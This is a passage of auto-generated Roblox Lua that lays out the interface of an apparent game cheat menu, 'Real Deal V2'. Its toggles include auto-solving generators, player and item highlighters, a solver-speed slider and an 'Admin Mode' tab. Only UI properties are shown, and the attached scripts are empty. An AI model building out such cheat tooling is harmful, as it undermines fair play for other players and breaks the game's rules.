G2L["51"]["BackgroundColor3"] = Color3.fromRGB(24, 119, 128);
G2L["51"]["Size"] = UDim2.new(1.00201, 0, 0.06056, 0);
G2L["51"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["51"]["Position"] = UDim2.new(-0.00254, 0, 0.93875, 0);
G2L["51"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["51"]["ScrollBarThickness"] = 4;


-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.General
G2L["52"] = Instance.new("TextButton", G2L["51"]);
G2L["52"]["TextWrapped"] = true;
G2L["52"]["BorderSizePixel"] = 0;
G2L["52"]["TextSize"] = 14;
G2L["52"]["TextScaled"] = true;
G2L["52"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52"]["BackgroundColor3"] = Color3.fromRGB(105, 105, 105);
G2L["52"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["52"]["Size"] = UDim2.new(0.03, 0, 0.8, 0);
G2L["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52"]["Text"] = [[General]];
G2L["52"]["Name"] = [[General]];
G2L["52"]["Position"] = UDim2.new(0.03, 0, 0, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.General.LocalScript
G2L["53"] = Instance.new("LocalScript", G2L["52"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.General.UICorner
G2L["54"] = Instance.new("UICorner", G2L["52"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Fun
G2L["55"] = Instance.new("TextButton", G2L["51"]);
G2L["55"]["TextWrapped"] = true;
G2L["55"]["BorderSizePixel"] = 0;
G2L["55"]["TextSize"] = 14;
G2L["55"]["TextScaled"] = true;
G2L["55"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["55"]["BackgroundColor3"] = Color3.fromRGB(105, 105, 105);
G2L["55"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["55"]["Size"] = UDim2.new(0.03, 0, 0.8, 0);
G2L["55"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["55"]["Text"] = [[Fun]];
G2L["55"]["Name"] = [[Fun]];
G2L["55"]["Position"] = UDim2.new(0.06, 0, 0, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Fun.LocalScript
G2L["56"] = Instance.new("LocalScript", G2L["55"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Fun.UICorner
G2L["57"] = Instance.new("UICorner", G2L["55"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.UIStroke
G2L["58"] = Instance.new("UIStroke", G2L["51"]);
G2L["58"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Stamina
G2L["59"] = Instance.new("TextButton", G2L["51"]);
G2L["59"]["TextWrapped"] = true;
G2L["59"]["BorderSizePixel"] = 0;
G2L["59"]["TextSize"] = 14;
G2L["59"]["TextScaled"] = true;
G2L["59"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(105, 105, 105);
G2L["59"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["59"]["Size"] = UDim2.new(0.03, 0, 0.8, 0);
G2L["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["59"]["Text"] = [[Stamina]];
G2L["59"]["Name"] = [[Stamina]];
G2L["59"]["Position"] = UDim2.new(0.09, 0, 0, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Stamina.LocalScript
G2L["5a"] = Instance.new("LocalScript", G2L["59"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Stamina.UICorner
G2L["5b"] = Instance.new("UICorner", G2L["59"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Extra
G2L["5c"] = Instance.new("TextButton", G2L["51"]);
G2L["5c"]["TextWrapped"] = true;
G2L["5c"]["BorderSizePixel"] = 0;
G2L["5c"]["TextSize"] = 14;
G2L["5c"]["TextScaled"] = true;
G2L["5c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(105, 105, 105);
G2L["5c"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5c"]["Size"] = UDim2.new(0.03, 0, 0.8, 0);
G2L["5c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5c"]["Text"] = [[Extra]];
G2L["5c"]["Name"] = [[Extra]];
G2L["5c"]["Position"] = UDim2.new(0.12, 0, 0, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Extra.LocalScript
G2L["5d"] = Instance.new("LocalScript", G2L["5c"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Extra.UICorner
G2L["5e"] = Instance.new("UICorner", G2L["5c"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.About
G2L["5f"] = Instance.new("TextButton", G2L["51"]);
G2L["5f"]["TextWrapped"] = true;
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["TextSize"] = 14;
G2L["5f"]["TextScaled"] = true;
G2L["5f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(105, 105, 105);
G2L["5f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5f"]["Size"] = UDim2.new(0.03, 0, 0.8, 0);
G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["Text"] = [[About]];
G2L["5f"]["Name"] = [[About]];
G2L["5f"]["Position"] = UDim2.new(0.15, 0, 0, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.About.LocalScript
G2L["60"] = Instance.new("LocalScript", G2L["5f"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.About.UICorner
G2L["61"] = Instance.new("UICorner", G2L["5f"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Credits
G2L["62"] = Instance.new("TextButton", G2L["51"]);
G2L["62"]["TextWrapped"] = true;
G2L["62"]["BorderSizePixel"] = 0;
G2L["62"]["TextSize"] = 14;
G2L["62"]["TextScaled"] = true;
G2L["62"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(105, 105, 105);
G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["62"]["Size"] = UDim2.new(0.03, 0, 0.8, 0);
G2L["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["62"]["Text"] = [[Credits]];
G2L["62"]["Name"] = [[Credits]];
G2L["62"]["Position"] = UDim2.new(0.18, 0, 0, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Credits.LocalScript
G2L["63"] = Instance.new("LocalScript", G2L["62"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Credits.UICorner
G2L["64"] = Instance.new("UICorner", G2L["62"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.STOPSKIDDIN
G2L["65"] = Instance.new("TextButton", G2L["51"]);
G2L["65"]["TextWrapped"] = true;
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["TextSize"] = 14;
G2L["65"]["TextScaled"] = true;
G2L["65"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(105, 105, 105);
G2L["65"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["65"]["Size"] = UDim2.new(0.03, 0, 0.8, 0);
G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Text"] = [[Info]];
G2L["65"]["Name"] = [[STOPSKIDDIN]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.STOPSKIDDIN.LocalScript
G2L["66"] = Instance.new("LocalScript", G2L["65"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.STOPSKIDDIN.UICorner
G2L["67"] = Instance.new("UICorner", G2L["65"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Admin Mode
G2L["68"] = Instance.new("TextButton", G2L["51"]);
G2L["68"]["TextWrapped"] = true;
G2L["68"]["BorderSizePixel"] = 0;
G2L["68"]["TextSize"] = 14;
G2L["68"]["TextScaled"] = true;
G2L["68"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["BackgroundColor3"] = Color3.fromRGB(105, 105, 105);
G2L["68"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["68"]["Size"] = UDim2.new(0.03, 0, 0.8, 0);
G2L["68"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["Text"] = [[Admin Mode]];
G2L["68"]["Name"] = [[Admin Mode]];
G2L["68"]["Position"] = UDim2.new(0.97, 0, 0, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Admin Mode.LocalScript
G2L["69"] = Instance.new("LocalScript", G2L["68"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.ScrollingFrame.Admin Mode.UICorner
G2L["6a"] = Instance.new("UICorner", G2L["68"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS
G2L["6b"] = Instance.new("Folder", G2L["43"]);
G2L["6b"]["Name"] = [[THETABS]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General
G2L["6c"] = Instance.new("Frame", G2L["6b"]);
G2L["6c"]["Visible"] = false;
G2L["6c"]["BorderSizePixel"] = 0;
G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(28, 138, 148);
G2L["6c"]["Size"] = UDim2.new(0.99982, 0, 0.8481, 0);
G2L["6c"]["Position"] = UDim2.new(0, 0, 0.08711, 0);
G2L["6c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6c"]["Name"] = [[General]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.GensSolver
G2L["6d"] = Instance.new("TextLabel", G2L["6c"]);
G2L["6d"]["TextWrapped"] = true;
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["TextSize"] = 18;
G2L["6d"]["TextScaled"] = true;
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["BackgroundTransparency"] = 1;
G2L["6d"]["RichText"] = true;
G2L["6d"]["Size"] = UDim2.new(0.50083, 0, 0.1226, 0);
G2L["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Text"] = [[Auto Generators ]];
G2L["6d"]["Name"] = [[GensSolver]];
G2L["6d"]["Position"] = UDim2.new(0.00129, 0, 0.02571, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.GensSolver.ImageButton
G2L["6e"] = Instance.new("ImageButton", G2L["6d"]);
G2L["6e"]["BorderSizePixel"] = 0;
G2L["6e"]["BackgroundTransparency"] = 1;
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["Image"] = [[rbxassetid://76864339841735]];
G2L["6e"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["6e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6e"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["6e"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.GensSolver.ImageButton.LocalScript
G2L["6f"] = Instance.new("LocalScript", G2L["6e"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.GensSolver.ImageButton.UICorner
G2L["70"] = Instance.new("UICorner", G2L["6e"]);
G2L["70"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.GensHighlighter
G2L["71"] = Instance.new("TextLabel", G2L["6c"]);
G2L["71"]["TextWrapped"] = true;
G2L["71"]["BorderSizePixel"] = 0;
G2L["71"]["TextSize"] = 18;
G2L["71"]["TextScaled"] = true;
G2L["71"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["71"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["71"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["71"]["BackgroundTransparency"] = 1;
G2L["71"]["RichText"] = true;
G2L["71"]["Size"] = UDim2.new(0.50083, 0, 0.1226, 0);
G2L["71"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["71"]["Text"] = [[Generator Highlighter]];
G2L["71"]["Name"] = [[GensHighlighter]];
G2L["71"]["Position"] = UDim2.new(0.49881, 0, 0.02571, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.GensHighlighter.ImageButton
G2L["72"] = Instance.new("ImageButton", G2L["71"]);
G2L["72"]["BorderSizePixel"] = 0;
G2L["72"]["BackgroundTransparency"] = 1;
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["Image"] = [[rbxassetid://76864339841735]];
G2L["72"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["72"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.GensHighlighter.ImageButton.LocalScript
G2L["73"] = Instance.new("LocalScript", G2L["72"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.GensHighlighter.ImageButton.UICorner
G2L["74"] = Instance.new("UICorner", G2L["72"]);
G2L["74"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.ItemHighlighter
G2L["75"] = Instance.new("TextLabel", G2L["6c"]);
G2L["75"]["TextWrapped"] = true;
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["TextSize"] = 18;
G2L["75"]["TextScaled"] = true;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["75"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["BackgroundTransparency"] = 1;
G2L["75"]["RichText"] = true;
G2L["75"]["Size"] = UDim2.new(0.50083, 0, 0.1226, 0);
G2L["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["Text"] = [[Item Highlighter]];
G2L["75"]["Name"] = [[ItemHighlighter]];
G2L["75"]["Position"] = UDim2.new(0.49502, 0, 0.25193, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.ItemHighlighter.ImageButton
G2L["76"] = Instance.new("ImageButton", G2L["75"]);
G2L["76"]["BorderSizePixel"] = 0;
G2L["76"]["BackgroundTransparency"] = 1;
G2L["76"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["Image"] = [[rbxassetid://76864339841735]];
G2L["76"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["76"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["76"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["76"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.ItemHighlighter.ImageButton.LocalScript
G2L["77"] = Instance.new("LocalScript", G2L["76"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.ItemHighlighter.ImageButton.UICorner
G2L["78"] = Instance.new("UICorner", G2L["76"]);
G2L["78"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.PlayerHighlighter
G2L["79"] = Instance.new("TextLabel", G2L["6c"]);
G2L["79"]["TextWrapped"] = true;
G2L["79"]["BorderSizePixel"] = 0;
G2L["79"]["TextSize"] = 18;
G2L["79"]["TextScaled"] = true;
G2L["79"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["79"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["79"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["79"]["BackgroundTransparency"] = 1;
G2L["79"]["RichText"] = true;
G2L["79"]["Size"] = UDim2.new(0.50083, 0, 0.1226, 0);
G2L["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["79"]["Text"] = [[Player Highlighter]];
G2L["79"]["Name"] = [[PlayerHighlighter]];
G2L["79"]["Position"] = UDim2.new(-0.00242, 0, 0.25257, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.PlayerHighlighter.ImageButton
G2L["7a"] = Instance.new("ImageButton", G2L["79"]);
G2L["7a"]["BorderSizePixel"] = 0;
G2L["7a"]["BackgroundTransparency"] = 1;
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["Image"] = [[rbxassetid://76864339841735]];
G2L["7a"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["7a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7a"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["7a"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.PlayerHighlighter.ImageButton.LocalScript
G2L["7b"] = Instance.new("LocalScript", G2L["7a"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.PlayerHighlighter.ImageButton.UICorner
G2L["7c"] = Instance.new("UICorner", G2L["7a"]);
G2L["7c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Chat Enabler/Disabler
G2L["7d"] = Instance.new("TextLabel", G2L["6c"]);
G2L["7d"]["TextWrapped"] = true;
G2L["7d"]["BorderSizePixel"] = 0;
G2L["7d"]["TextSize"] = 24;
G2L["7d"]["TextScaled"] = true;
G2L["7d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7d"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7d"]["BackgroundTransparency"] = 1;
G2L["7d"]["RichText"] = true;
G2L["7d"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["7d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7d"]["Text"] = [[Chat Enable/Disable]];
G2L["7d"]["Name"] = [[Chat Enabler/Disabler]];
G2L["7d"]["Position"] = UDim2.new(0.47211, 0, 0.5007, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Chat Enabler/Disabler.ImageButton
G2L["7e"] = Instance.new("ImageButton", G2L["7d"]);
G2L["7e"]["BorderSizePixel"] = 0;
G2L["7e"]["BackgroundTransparency"] = 1;
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["Image"] = [[rbxassetid://76864339841735]];
G2L["7e"]["Size"] = UDim2.new(0.38043, 0, 0.71651, 0);
G2L["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["Position"] = UDim2.new(0.23535, 0, 1, 0);
-- Attributes
G2L["7e"]:SetAttribute([[toggle]], [[]]);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Chat Enabler/Disabler.ImageButton.LocalScript
G2L["7f"] = Instance.new("LocalScript", G2L["7e"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Chat Enabler/Disabler.ImageButton.UICorner
G2L["80"] = Instance.new("UICorner", G2L["7e"]);
G2L["80"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Do1Gen
G2L["81"] = Instance.new("TextLabel", G2L["6c"]);
G2L["81"]["TextWrapped"] = true;
G2L["81"]["BorderSizePixel"] = 0;
G2L["81"]["TextSize"] = 24;
G2L["81"]["TextScaled"] = true;
G2L["81"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["81"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["81"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["81"]["BackgroundTransparency"] = 1;
G2L["81"]["RichText"] = true;
G2L["81"]["Size"] = UDim2.new(0.41853, 0, 0.11618, 0);
G2L["81"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["81"]["Text"] = [[Solve One Generator]];
G2L["81"]["Name"] = [[Do1Gen]];
G2L["81"]["Position"] = UDim2.new(0.55257, 0, 0.73382, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Do1Gen.TextButton
G2L["82"] = Instance.new("TextButton", G2L["81"]);
G2L["82"]["TextWrapped"] = true;
G2L["82"]["BorderSizePixel"] = 0;
G2L["82"]["TextSize"] = 14;
G2L["82"]["TextScaled"] = true;
G2L["82"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(16, 16, 16);
G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["82"]["Size"] = UDim2.new(0.96743, 0, 0.96833, 0);
G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["Text"] = [[SOLVE]];
G2L["82"]["Position"] = UDim2.new(0, 0, 0.9877, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Do1Gen.TextButton.LocalScript
G2L["83"] = Instance.new("LocalScript", G2L["82"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Do1Gen.TextButton.UICorner
G2L["84"] = Instance.new("UICorner", G2L["82"]);
G2L["84"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Slider
G2L["85"] = Instance.new("CanvasGroup", G2L["6c"]);
G2L["85"]["Active"] = true;
G2L["85"]["BorderSizePixel"] = 0;
G2L["85"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["85"]["Size"] = UDim2.new(0.501, 0, 0.1, 0);
G2L["85"]["Position"] = UDim2.new(0.017, 0, 0.87, 0);
G2L["85"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["85"]["Name"] = [[Slider]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Slider.Slider
G2L["86"] = Instance.new("Frame", G2L["85"]);
G2L["86"]["BorderSizePixel"] = 0;
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["Name"] = [[Slider]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Slider.Slider.LocalScript
G2L["87"] = Instance.new("LocalScript", G2L["86"]);



-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Slider.Slider.UICorner
G2L["88"] = Instance.new("UICorner", G2L["86"]);
G2L["88"]["CornerRadius"] = UDim.new(0, 30);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Slider.Slider.Fill
G2L["89"] = Instance.new("Frame", G2L["86"]);
G2L["89"]["BorderSizePixel"] = 0;
G2L["89"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["89"]["Size"] = UDim2.new(0.99917, 0, 1, 0);
G2L["89"]["Position"] = UDim2.new(-0, 0, 0, 0);
G2L["89"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["89"]["Name"] = [[Fill]];


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Slider.Slider.Fill.UICorner
G2L["8a"] = Instance.new("UICorner", G2L["89"]);
G2L["8a"]["CornerRadius"] = UDim.new(0, 30);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Slider.Slider.Fill.UIStroke
G2L["8b"] = Instance.new("UIStroke", G2L["89"]);
G2L["8b"]["Thickness"] = 1.3;
G2L["8b"]["Color"] = Color3.fromRGB(109, 109, 109);
G2L["8b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Slider.Slider.Trigger
G2L["8c"] = Instance.new("TextButton", G2L["86"]);
G2L["8c"]["TextWrapped"] = true;
G2L["8c"]["BorderSizePixel"] = 0;
G2L["8c"]["TextSize"] = 14;
G2L["8c"]["TextScaled"] = true;
G2L["8c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8c"]["ZIndex"] = 100;
G2L["8c"]["BackgroundTransparency"] = 1;
G2L["8c"]["Size"] = UDim2.new(0.98136, 0, 0.98593, 0);
G2L["8c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8c"]["Text"] = [[]];
G2L["8c"]["Name"] = [[Trigger]];
G2L["8c"]["Position"] = UDim2.new(-0, 0, 0, 0);
-- Attributes
G2L["8c"]:SetAttribute([[OutputValue]], 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Slider.Slider.OuputLabel
G2L["8d"] = Instance.new("TextLabel", G2L["86"]);
G2L["8d"]["TextWrapped"] = true;
G2L["8d"]["ZIndex"] = 9;
G2L["8d"]["BorderSizePixel"] = 0;
G2L["8d"]["TextSize"] = 30;
G2L["8d"]["TextScaled"] = true;
G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["FontFace"] = Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Bold, Enum.FontStyle.Italic);
G2L["8d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["8d"]["BackgroundTransparency"] = 1;
G2L["8d"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["8d"]["Size"] = UDim2.new(1, 0, 0.5, 0);
G2L["8d"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["Name"] = [[OuputLabel]];
G2L["8d"]["Position"] = UDim2.new(0, 0, 0.5, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Slider.Slider.OuputLabel.UIStroke
G2L["8e"] = Instance.new("UIStroke", G2L["8d"]);
G2L["8e"]["Thickness"] = 3;


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Slider.UICorner
G2L["8f"] = Instance.new("UICorner", G2L["85"]);
G2L["8f"]["CornerRadius"] = UDim.new(0, 30);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.SliderText
G2L["90"] = Instance.new("TextLabel", G2L["6c"]);
G2L["90"]["TextWrapped"] = true;
G2L["90"]["BorderSizePixel"] = 0;
G2L["90"]["TextSize"] = 35;
G2L["90"]["TextScaled"] = true;
G2L["90"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["90"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["90"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["90"]["BackgroundTransparency"] = 1;
G2L["90"]["RichText"] = true;
G2L["90"]["Size"] = UDim2.new(0.501, 0, 0.123, 0);
G2L["90"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["90"]["Text"] = [[Generator Solver speed]];
G2L["90"]["Name"] = [[SliderText]];
G2L["90"]["Position"] = UDim2.new(0.01659, 0, 0.73477, 0);


-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.General.Auto one egg's popup LMA0
G2L["91"] = Instance.new("TextLabel", G2L["6c"]);
G2L["91"]["TextWrapped"] = true;
G2L["91"]["BorderSizePixel"] = 0;
G2L["91"]["TextSize"] = 24;
G2L["91"]["TextScaled"] = true;
